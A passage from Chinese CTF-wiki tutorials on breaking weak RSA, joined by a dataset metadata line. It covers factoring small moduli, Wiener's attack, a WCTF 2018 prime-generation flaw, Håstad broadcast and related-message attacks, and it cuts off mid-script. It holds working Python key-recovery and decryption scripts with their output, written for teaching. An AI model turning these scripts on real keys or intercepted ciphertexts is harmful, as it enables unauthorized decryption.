KEY-----\n```\n\n发现虽然说是 2048 位，但是显然模数没有那么长，尝试分解下，得到\n\n```\np=250527704258269\nq=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\n```\n\n然后就可以构造，并且解密，代码如下\n\n```python\nfrom Crypto.PublicKey import RSA\nimport gmpy2\nfrom base64 import b64decode\np = 250527704258269\nq = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\ne = 65537\nn = p * q\n\n\ndef getprivatekey(n, e, p, q):\n    phin = (p - 1) * (q - 1)\n    d = gmpy2.invert(e, phin)\n    priviatekey = RSA.construct((long(n), long(e), long(d)))\n    with open('private.pem', 'w') as f:\n        f.write(priviatekey.exportKey())\n\n\ndef decrypt():\n    with open('./level1.passwd.enc') as f:\n        cipher = f.read()\n    cipher = b64decode(cipher)\n    with open('./private.pem') as f:\n        key = RSA.importKey(f)\n    print key.decrypt(cipher)\n\n\n#getprivatekey(n, e, p, q)\ndecrypt()\n\n```\n\n发现不对\n\n```shell\n➜  level0 git:(master) ✗ python exp.py\n一堆乱码。。\n\n```\n\n这时候就要考虑其他情况了，一般来说现实中实现的 RSA 都不会直接用原生的 RSA，都会加一些填充比如 OAEP，我们这里试试，修改代码\n\n```shell\ndef decrypt1():\n    with open('./level1.passwd.enc') as f:\n        cipher = f.read()\n    cipher = b64decode(cipher)\n    with open('./private.pem') as f:\n        key = RSA.importKey(f)\n        key = PKCS1_OAEP.new(key)\n    print key.decrypt(cipher)\n\n```\n\n果然如此，得到\n\n```shell\n➜  level0 git:(master) ✗ python exp.py\nFaC5ori1ati0n_aTTA3k_p_tOO_sma11\n```\n\n得到解压密码。继续，查看 level1 中的公钥\n\n```shell\n➜  level1 git:(master) ✗ openssl rsa -pubin -in public.key -text -modulus\nPublic-Key: (2048 bit)\nModulus:\n    00:c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c:\n    2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34:\n    c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0:\n    11:11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4:\n    f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e:\n    4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93:\n    45:16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3:\n    3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36:\n    e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c:\n    87:2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da:\n    39:83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc:\n    41:64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0:\n    54:35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18:\n    12:67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb:\n    00:22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e:\n    b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a:\n    12:27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61:\n    3e:7d\nExponent: 65537 (0x10001)\nModulus=C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv\nKp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg\n/duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ\nOaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA\nVgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5\nPbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+\nfQIDAQAB\n-----END PUBLIC KEY-----\n\n```\n\n似乎还是不是很大，再次分解，然后试了 factordb 不行，试试 yafu。结果分解出来了。\n\n```shell\nP309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383\n\nP309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259\n\n```\n\n可以发现这两个数非常相近，可能是 factordb 没有实现这类分解。\n\n继而下面的操作类似于 level0。只是这次是直接解密就好，没啥填充，试了填充反而错\n\n得到密码 `fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS`。继续下一步，查看公钥\n\n```shell\n➜  level2 git:(master) ✗ openssl rsa -pubin -in public.key -text -modulus\nPublic-Key: (1025 bit)\nModulus:\n    01:ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90:\n    c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85:\n    8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33:\n    f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d:\n    73:e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9:\n    cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32:\n    16:9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63:\n    76:59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d:\n    d5:24:7d:4f:a7:a1:f0:d5:73\nExponent:\n    01:00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7:\n    50:5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd:\n    92:70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf:\n    2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22:\n    28:66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00:\n    6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8:\n    1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc:\n    ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa:\n    68:29:6d:66:7c:cf:57:b9:4b\nModulus=1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN\nEj2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm\nHZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq\nW7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC\n3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7\np2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8\nz1e5Sw==\n-----END PUBLIC KEY-----\n\n```\n\n发现私钥 e 和 n 几乎一样大，考虑 d 比较小，使用 Wiener's Attack。得到 d，当然也可以再次验证一遍。\n\n```shell\n➜  level2 git:(master) ✗ python RSAwienerHacker.py\nTesting Wiener Attack\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\n```\n\n这时我们解密密文，解密代码如下\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\nimport gmpy2\nfrom base64 import b64decode\nd = 29897859398360008828023114464512538800655735360280670512160838259524245332403L\nwith open('./public.key') as f:\n    key = RSA.importKey(f)\n    n = key.n\n    e = key.e\n\n\ndef getprivatekey(n, e, d):\n    priviatekey = RSA.construct((long(n), long(e), long(d)))\n    with open('private.pem', 'w') as f:\n        f.write(priviatekey.exportKey())\n\n\ndef decrypt():\n    with open('./level3.passwd.enc') as f:\n        cipher = f.read()\n    with open('./private.pem') as f:\n        key = RSA.importKey(f)\n    print key.decrypt(cipher)\n\n\ngetprivatekey(n, e, d)\ndecrypt()\n```\n\n利用末尾的字符串 `wIe6ER1s_1TtA3k_e_t00_larg3` 解密压缩包，注意去掉 B。至此全部解密结束，得到 flag。\n\n## 2018 WCTF RSA\n\n题目基本描述为\n\n```\nDescription:\nEncrypted message for user \"admin\":\n\n<<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>>\n\nadmin public key:\n\nn = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927\ne = 65537\n\nService: http://36.110.234.253\n\n```\n\n这个题目现在已经没有办法在线获取 binary 了，现在得到的 binary 是之前已经下载好的，我们当时需要登录用户的 admin 来下载对应的 generator。\n\n通过简单逆向这个 generator，我们可以发现这个程序是这么工作的\n\n- 利用用户给定的 license（32 个字节），迭代解密某个**固定位置**之后的数据，每 32 个字节一组，与密钥相异或得到结果。\n- 密钥的生成方法为 \n    - $k_1=key$\n    - $k_2 =sha256(k_1)$\n    - ...\n    - $k_n=sha256(k_{n-1})$\n\n其中，固定位置就是在找源文件 `generator` 中第二次出现 `ENCRYPTED` 的位置，然后再次偏移 32 个字节。\n\n```python\n    _ENCRYPT_STR = ENCRYPTED_STR;\n    v10 = 0;\n    ENCRYPTED_LEN = strlen(ENCRYPTED_STR);\n    do\n    {\n      do\n        ++v9;\n      while ( strncmp(&file_contents[v9], _ENCRYPT_STR, ENCRYPTED_LEN) );\n      ++v10;\n    }\n    while ( v10 <= 1 );\n    v11 = &file_start_off_32[loc2 + ENCRYPTED_LEN];\n    v12 = loc2 + ENCRYPTED_LEN;\n    len = file_size - (loc2 + ENCRYPTED_LEN) - 32;\n    decrypt(&file_start_off_32[v12], &license, len);\n    sha256_file_start(v11, len, &output);\n    if ( !memcmp(&output, &file_contents[v12], 0x20u) )\n    {\n      v14 = fopen(\"out.exe\", \"wb\");\n      fwrite(v11, 1u, len, v14);\n      fclose(v14);\n      sprintf(byte_406020, \"out.exe %s\", argv[1]);\n      system(byte_406020);\n    }\n```\n\n同时，我们需要确保生成的文件的校验对应的哈希值恰好为指定的值，由于文件最后是一个 exe 文件，所以我们可以认为最后的文件头就是标准的 exe 文件，因此就不需要知道原始的 license 文件，进而我们可以编写 python 脚本生成 exe。\n\n在生成的 exe 中，我们分析出程序的基本流程为\n\n1. 读取 license\n2. 使用 license 作为 seed 分别生成 pq\n3. 利用 p，q 生成 n，e，d。\n\n其漏洞出现在生成 p，q 的方法上，而且生成 p 和 q 的方法类似。\n\n我们如果仔细分析下生成素数的函数的话，可以看到每个素数都是分为两部分生成的\n\n1. 生成左半部分 512 位。\n2. 生成右半部分 512 位。\n3. 左右构成 1024 比特位，判断是不是素数，是素数就成功，不是素数，继续生成。\n\n其中生成每部分的方式相同，方式为\n\n```python\nsha512(const1|const2|const3|const4|const5|const6|const7|const8|v9)\nv9=r%1000000007\n```\n\n 只有 v9 会有所变化，但是它的范围却是固定的。\n\n那么，如果我们表示 p，q 为\n\n$p=a*2^{512}+b$\n\n$q=c*2^{512}+d$\n\n那么\n\n$n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd$\n\n那么\n\n$n \\equiv bd \\bmod 2^{512}$\n\n而且由于 p 和 q 在生成时，a，b，c，d 均只有 1000000007 种可能性。\n\n进而，我们可以枚举所有的可能性，首先计算出 b 可能的集合为 S，同时我们使用中间相遇攻击，计算\n\n$n/d \\equiv b \\bmod 2^{512}$\n\n这里由于 b 和 d 都是 p 的尾数，所以一定不会是 2 的倍数，进而必然存在逆元。\n\n这样做虽然可以，然而，我们可以简单算一下存储空间\n\n$64*1000000007 / 1024 / 1024 / 1024=59$\n\n也就是说需要 59 G，太大了，，所以我们仍然需要进一步考虑\n\n$n \\equiv bd \\bmod 2^{64}$\n\n这样，我们的内存需求瞬间就降到了 8 G左右。我们仍然使用枚举的方法进行运算。\n\n其次，我们不能使用 python，，python 占据空间太大，因此需要使用 c/c++ 编写。\n\n枚举所有可能的 d 计算对应的值 $n/d$ 如果对应的值在集合 S 中，那么我们就可以认为找到了一对合法的 b 和 d，因此我们就可以恢复 p 和 q 的一半。\n\n之后，我们根据\n\n$n-bd=ac*2^{1024}+(ad+bc)*2^{512}$\n\n可以得到\n\n$\\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc$\n\n$\\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512}$\n\n类似地，我们可以计算出 a 和 c，从而我们就可以完全恢复出 p 和 q。\n\n在具体求解的过程中，在求 p 和 q 的一部分时，可以发现因为是模 $2^{64}$，所以可能存在碰撞（但其实就是一个是 p，另外一个是q，恰好对称。）。下面我们就求得了 b 对应的 v9。\n\n**注意：这里枚举出来的空间大约占用 11 个 G（包括索引），所以请选择合适的位置。**\n\n```\nb64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137\nsearch 23000000\nsearch 32000000\nsearch 2b000000\nsearch d000000\nsearch 3a000000\nsearch 1c000000\nsearch 6000000\nsearch 24000000\nsearch 15000000\nsearch 33000000\nsearch 2c000000\nsearch e000000\nb64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175\nsearch 1d000000\nsearch 3b000000\nsearch 7000000\nsearch 16000000\nsearch 25000000\nsearch 34000000\n```\n\n其实，我们在真正得到 p 或者 q 的一部分后，另外一部分完全可以使用暴力枚举的方式获取，因为计算量几乎都是一样的，最后结果为\n\n```python\n...\nhash 7000000\nhash 30000000\np = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869\nq = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283\nplain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885\nhash 16000000\nhash 25000000\nhash b000000\nhash 34000000\nhash 1a000000\n...\n➜  2018-WCTF-rsa git:(master) ✗ python\nPython 2.7.14 (default, Mar 22 2018, 14:43:05)\n[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> p=13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885\n>>> hex(p)[2:].decode('hex')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\", line 42, in hex_decode\n    output = binascii.a2b_hex(input)\nTypeError: Odd-length string\n>>> hex(p)[2:-1].decode('hex')\n'flag{fa6778724ed740396fc001b198f30313}'\n```\n\n最后我们便拿到 flag 了。\n\n**详细的利用代码请参见 ctf-challenge 仓库。**\n\n相关编译指令，需要链接相关的库。\n\n```shell\ng++  exp2.cpp -std=c++11 -o main2 -lgmp -lcrypto -pthread\n```\n\n## 参考\n\n- https://upbhack.de/posts/wctf-2018-writeup-rsa/\n", "timestamp": "2025-10-21T22:02:48.501563"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_coppersmith_attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_coppersmith_attack.md", "content": "# Coppersmith 相关攻击\n\n## 基本原理\n\nCoppersmith 相关攻击与[Don Coppersmith](https://en.wikipedia.org/wiki/Don_Coppersmith) 紧密相关，他提出了一种针对于模多项式（单变量，二元变量，甚至多元变量）找所有小整数根的多项式时间的方法。\n\n这里我们以单变量为主进行介绍，假设\n\n- 模数为 N ，N 具有一个因子 $b\\geq N^{\\beta},0< \\beta \\leq 1$\n- 多项式 F 的次数为 $\\delta$\n\n那么该方法可以在$O(c\\delta^5log^9(N))$ 的复杂度内找到该多项式所有的根$x_0$，这里我们要求 $|x_0|<cN^{\\frac{\\beta^2}{\\delta}}$ 。\n\n在这个问题中，我们的目标是找到在模 N 意义下多项式所有的根，这一问题被认为是复杂的。**Coppersmith method** 主要是通过 [Lenstra–Lenstra–Lovász lattice basis reduction algorithm](https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm)（LLL）方法找到\n\n- 与该多项式具有相同根 $x_0$\n- 更小系数\n- 定义域为整数域\n\n的多项式 g，由于在整数域上找多项式的根是简单的（Berlekamp–Zassenhaus），从而我们就得到了原多项式在模意义下的整数根。\n\n那么问题的关键就是如何将 f 转换到 g 呢？Howgrave-Graham 给出了一种思路\n\n![image-20180717210921382](figure/coppersmith-howgrave-graham.png)\n\n也就是说我们需要找到一个具有“更小系数”的多项式 g，也就是下面的转换方式\n\n![image-20180717211351350](figure/coppersmith-f2g.png)\n\n在 LLL 算法中，有两点是非常有用的\n\n- 只对原来的基向量进行整数线性变换，这可以使得我们在得到 g 时，仍然以原来的 $x_0$ 为根。\n- 生成的新的基向量的模长是有界的，这可以使得我们利用 Howgrave-Graham 定理。\n\n在这样的基础之上，我们再构造出多项式族 g 就可以了。\n\n关于更加细节的内容，请自行搜索。同时这部分内容也会不断更新。\n\n需要注意的是，由于 Coppersmith 根的约束，在 RSA 中的应用时，往往只适用于 e 较小的情况。\n\n## Basic Broadcast Attack\n\n### 攻击条件\n\n如果一个用户使用同一个加密指数 e 加密了同一个密文，并发送给了其他 e 个用户。那么就会产生广播攻击。这一攻击由 Håstad 提出。\n\n### 攻击原理\n\n这里我们假设 e 为 3，并且加密者使用了三个不同的模数 $n_1,n_2,n_3$ 给三个不同的用户发送了加密后的消息 m，如下\n\n$$\n\\begin{align*}\nc_1&=m^3\\bmod n_1 \\\\\nc_2&=m^3\\bmod n_2 \\\\\nc_3&=m^3\\bmod n_3\n\\end{align*}\n$$\n\n这里我们假设 $n_1,n_2,n_3$ 互素，不然，我们就可以直接进行分解，然后得到 d，进而然后直接解密。\n\n同时，我们假设 $m<n_i, 1\\leq i \\leq 3$。如果这个条件不满足的话，就会使得情况变得比较复杂，这里我们暂不讨论。\n\n既然他们互素，那么我们可以根据中国剩余定理，可得$m^3 \\equiv C \\bmod n_1n_2n_3$。\n\n此外，既然 $m<n_i, 1\\leq i \\leq 3$，那么我们知道 $m^3 < n_1n_2n_3$ 并且 $C<m^3 < n_1n_2n_3$，那么 $m^3 = C$，我们对 C 开三次根即可得到 m 的值。\n\n对于较大的 e 来说，我们只是需要更多的明密文对。\n\n### SCTF RSA3 LEVEL4\n\n参考 http://ohroot.com/2016/07/11/rsa-in-ctf。\n\n这里我们以 SCTF RSA3 中的 level4 为例进行介绍，首先编写代码提取 cap 包中的数据，如下\n\n```shell\n#!/usr/bin/env python\n\nfrom scapy.all import *\nimport zlib\nimport struct\n\nPA = 24\npackets = rdpcap('./syc_security_system_traffic3.pcap')\nclient = '192.168.1.180'\nlist_n = []\nlist_m = []\nlist_id = []\ndata = []\nfor packet in packets:\n    # TCP Flag PA 24 means carry data\n    if packet[TCP].flags == PA or packet[TCP].flags == PA + 1:\n        src = packet[IP].src\n        raw_data = packet[TCP].load\n        head = raw_data.strip()[:7]\n        if head == \"We have\":\n            n, e = raw_data.strip().replace(\"We have got N is \",\n                                            \"\").split('\\ne is ')\n            data.append(n.strip())\n        if head == \"encrypt\":\n            m = raw_data.replace('encrypted messages is 0x', '').strip()\n            data.append(str(int(m, 16)))\n\nwith open('./data.txt', 'w') as f:\n    for i in range(0, len(data), 2):\n        tmp = ','.join(s for s in data[i:i + 2])\n        f.write(tmp + '\\n')\n\n```\n\n其次，利用得到的数据直接使用中国剩余定理求解。\n\n```python\nfrom functools import reduce\nimport gmpy\nimport json, binascii\n\n\ndef modinv(a, m):\n    return int(gmpy.invert(gmpy.mpz(a), gmpy.mpz(m)))\n\n\ndef chinese_remainder(n, a):\n    sum = 0\n    prod = reduce(lambda a, b: a * b, n)\n    # 并行运算\n    for n_i, a_i in zip(n, a):\n        p = prod // n_i\n        sum += a_i * modinv(p, n_i) * p\n    return int(sum % prod)\n\n\nnset = []\ncset = []\nwith open(\"data.txt\") as f:\n    now = f.read().strip('\\n').split('\\n')\n    for item in now:\n        item = item.split(',')\n        nset.append(int(item[0]))\n        cset.append(int(item[1]))\n\nm = chinese_remainder(nset, cset)\nm = int(gmpy.mpz(m).root(19)[0])\nprint binascii.unhexlify(hex(m)[2:-1])\n\n```\n\n得到密文，然后再次解密即可得到 flag。\n\n```shell\nH1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l\n```\n\n### 题目\n\n- 2017 WHCTF OldDriver\n- 2018 N1CTF easy_fs\n\n## Broadcast Attack with Linear Padding\n\n对于具有线性填充的情况下，仍然可以攻击，这时候就会使用 **Coppersmith method** 的方法了，这里暂不介绍。可以参考\n\n- https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations\n\n## Related Message Attack\n\n### 攻击条件\n\n当 Alice 使用同一公钥对两个具有某种线性关系的消息 M1 与 M2 进行加密，并将加密后的消息 C1，C2 发送给了 Bob 时，我们就可能可以获得对应的消息 M1 与 M2。这里我们假设模数为 N，两者之间的线性关系如下\n\n$$\nM_1 \\equiv f(M_2) \\bmod N\n$$\n\n其中 f 为一个线性函数，比如说 $f=ax+b$。\n\n在具有较小错误概率下的情况下，其复杂度为 $O(elog^2N)$。\n\n这一攻击由 Franklin，Reiter 提出。\n\n### 攻击原理\n\n首先，我们知道 $C_1 \\equiv M_1 ^e \\bmod N$，并且 $M_1 \\equiv f(M_2) \\bmod N$，那么我们可以知道 $M_2$ 是 $f(x)^e \\equiv C_1 \\bmod N$ 的一个解，即它是方程 $f(x)^e-C_1$ 在模 N 意义下的一个根。同样的，$M_2$ 是 $x^e - C_2$ 在模 N 意义下的一个根。所以说 $x-M_2$ 同时整除以上两个多项式。因此，我们可以求得两个多项式的最大公因子，如果最大公因子恰好是线性的话，那么我们就求得了 $M_2$。需要注意的是，在 $e=3$ 的情况下，最大公因子一定是线性的。\n\n这里我们关注一下 $e=3$，且 $f(x)=ax+b$ 的情况。首先我们有\n\n$$\nC_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N\n$$\n\n那么我们有\n\n$$\nC_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N\n$$\n\n我们需要明确一下我们想要得到的是消息 m，所以需要将其单独构造出来。\n\n首先，我们有式 1\n\n$$\n(aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3\n$$\n\n再者我们构造如下式 2\n\n$$\n(aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N\n$$\n\n根据式 1 我们有\n\n$$\na^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N\n$$\n\n继而我们有式 3\n\n$$\n3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N\n$$\n\n那么我们根据式 2 与式 3 可得\n\n$$\n(a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N\n$$\n\n进而我们有\n\n$$\naM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}\n$$\n\n进而\n\n$$\naM_2\\equiv  \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}\n$$\n\n进而\n\n$$\nM_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}\n$$\n\n上面的式子中右边所有的内容都是已知的内容，所以我们可以直接获取对应的消息。\n\n有兴趣的可以进一步阅读 [A New Related Message Attack on RSA](https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf) 以及 [paper](https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf) 这里暂不做过多的讲解。\n\n### SCTF RSA3\n\n这里我们以 SCTF RSA3 中的 level3 为例进行介绍。首先，跟踪 TCP 流可以知道，加密方式是将明文加上用户的 user id 进行加密，而且还存在多组。这里我们选择第 0 组和第 9 组，他们的模数一样，解密脚本如下\n\n```python\nimport gmpy2\nid1 = 1002\nid2 = 2614\n\nc1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L\nc2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L\nn = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553\na = 1\nb = id1 - id2\n\n\ndef getmessage(a, b, c1, c2, n):\n    b3 = gmpy2.powmod(b, 3, n)\n    part1 = b * (c1 + 2 * c2 - b3) % n\n    part2 = a * (c1 - c2 + 2 * b3) % n\n    part2 = gmpy2.invert(part2, n)\n    return part1 * part2 % n\n\n\nmessage = getmessage(a, b, c1, c2, n) - id2\nmessage = hex(message)[2:]\nif len(message) % 2 != 0:\n    message = '0' + message\n\nprint message.decode('hex')\n\n```\n\n得到明文\n\n```shell\n➜  sctf-rsa3-level3 git:(master) ✗ python exp.py\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL\n```\n\n当然，我们也可以直接使用 sage 来做，会更加简单一点。\n\n```python\nimport binascii\n\ndef attack(c1, c2, b, e, n):\n    